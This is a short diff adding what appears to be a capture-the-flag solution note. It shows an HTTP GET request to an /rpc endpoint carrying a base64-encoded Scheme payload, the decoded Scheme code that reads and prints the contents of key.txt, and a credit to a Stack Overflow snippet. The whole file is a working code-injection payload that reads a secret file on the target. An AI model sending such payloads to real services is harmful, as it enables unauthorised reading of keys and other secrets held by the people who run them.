@@ -1,0 +1,11 @@
+GET /rpcKGNhbGwtd2l0aC1pbnB1dC1maWxlICJrZXkudHh0IiAgIChsYW1iZGEgKGlucHV0LXBvcnQpICAg\nICAobGV0IGxvb3AgKCh4IChyZWFkLWNoYXIgaW5wdXQtcG9ydCkpKSAgICAgICAoaWYgKG5vdCAo\nZW9mLW9iamVjdD8geCkpICAgICAgICAgICAoYmVnaW4gICAgICAgICAgICAgKGRpc3BsYXkgeCkg\nICAgICAgICAgICAgKGxvb3AgKHJlYWQtY2hhciBpbnB1dC1wb3J0KSkpKSkpKQ==
+^ outputs contents of key.txt, payload is base64 encoded:
+(call-with-input-file "key.txt"
+   (lambda (input-port)
+     (let loop ((x (read-char input-port)))
+       (if (not (eof-object? x))
+           (begin
+             (display x)
+             (loop (read-char input-port)))))))
+
+stolen from: http://stackoverflow.com/questions/4181355/file-i-o-operations-scheme
